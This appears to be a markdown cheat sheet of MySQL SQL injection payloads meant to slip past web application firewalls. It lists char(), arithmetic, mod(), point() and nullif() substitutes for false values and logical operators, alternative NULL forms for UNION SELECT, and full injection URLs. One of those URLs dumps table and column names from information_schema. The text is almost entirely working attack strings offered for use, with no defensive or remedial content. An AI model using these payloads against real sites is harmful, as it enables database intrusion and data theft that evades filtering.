## The Alternative Ways of using `AND/OR 0` in SQLi (MySQL Specific)

- Traditional Way of using `AND/OR 0`
> ```sql
> and 1=0
> and false
> and 0
> and 50=60
> any number that are not the same will equal to (0, false, null)
> ```

- The Alternative Way of using `0` in `AND/OR 0` (for WAF bypass)
> - Using char() for 0, null, false values
> ```sql
> and char(0)
> and char(false)
> and char(null)
> ```
> - For Example:
> ```sql
> https://www.example.com/index.php?id=1 and char(0) Union Select '1 and char(0) union select 1,2,group_concat(0x3c6c693e,table_name,0x203a3a20,column_name),4,5,6 from information_schema.columns where table_schema=database()',2,3,4,5,6--+-
> ```

> - Any Mathematical/arithmetic or logical problems that are equal to 0
> ```sql
> and 1*0
> and 1-1
> and 0/1
> ```
> - For example:
> ```sql
> https://www.example.com/index.php?id=1 and 1*0 order by 1--
> ```

> - Using mod()
> ```sql
> and mod(29,9)
> ```

> - Using point()
> ```sql
> and point(29,9)
> ```

> - Using nullif()
> ```sql
> nullif(1337, 1337)
> ```

- The Alternative Way of using `AND/OR` in `AND/OR 0` (for WAF bypass)
> ```sql
> %             == Modulo
> &             == Bitwise And
> &&            == Logical And
> |             == Bitwise Or
> ||            == Logical Or
> ```
> - Example:
> ```sql
> https://www.example.com/index.php?id=1 % point(29,9) Order by 10--
> https://www.example.com/index.php?id=1 && point(29,9) Order by 10--
> https://www.example.com/index.php?id=1 ||point(29,9) Order by 11--
> ```

---

## The Alternative Way of using `NULL` in SQLi (MySQL)

- Traditional Way of using `NULL`
> ```sql
> UNION SELECT null, null, null, null
> ```

- The Alternative Way of using `NULL` (WAF Bypass)
> ```sql
> Union Select 0,0,0,0
> Union Select false,false,false,false
> Union Select char(null),char(null),char(null),char(null)
> Union Select char(false),char(false),char(false),char(false)
> Union Select (0*1337-0),(0*1337-0),(0*1337-0),(0*1337-0)
> Union Select 34=35,34=35,34=35,34=35
> ```
